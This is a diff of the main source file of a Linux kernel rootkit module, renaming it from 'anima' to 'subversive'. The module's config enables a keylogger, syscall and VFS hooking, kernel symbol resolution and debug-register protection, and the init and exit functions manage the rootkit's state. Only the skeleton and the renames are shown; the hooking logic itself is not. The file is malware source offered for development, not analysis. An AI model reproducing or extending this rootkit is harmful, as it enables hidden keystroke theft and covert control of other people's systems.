@@ -1,17 +1,17 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 
-#include <anima/arch.h>
-#include <anima/config.h>
-#include <anima/debug.h>
-#include <anima/keylogger.h>
-#include <anima/ksyms.h>
-#include <anima/syscalls.h>
-#include <anima/vfs.h>
+#include <subversive/arch.h>
+#include <subversive/config.h>
+#include <subversive/debug.h>
+#include <subversive/keylogger.h>
+#include <subversive/ksyms.h>
+#include <subversive/syscalls.h>
+#include <subversive/vfs.h>
 
 MODULE_LICENSE("GPL");
 
-struct anima_config rk_cfg = {
+struct subversive_config rk_cfg = {
 	.state = RK_BOOT,
 #ifdef ARCH_X86
 	.dr_protect = 1,
@@ -22,7 +22,7 @@ struct anima_config rk_cfg = {
 	.keylogger = 1,
 };
 
-static int __init anima_init(void)
+static int __init subversive_init(void)
 {
 	int ret;
 
@@ -55,7 +55,7 @@ static int __init anima_init(void)
 	return 0;
 }
 
-static void __exit anima_exit(void)
+static void __exit subversive_exit(void)
 {
 	rk_cfg.state = RK_SHUTDOWN;
 	if (rk_cfg.keylogger)
@@ -71,5 +71,5 @@ static void __exit anima_exit(void)
 	arch_hw_breakpoint_exit();
 }
 
-module_init(anima_init);
-module_exit(anima_exit);
+module_init(subversive_init);
+module_exit(subversive_exit);
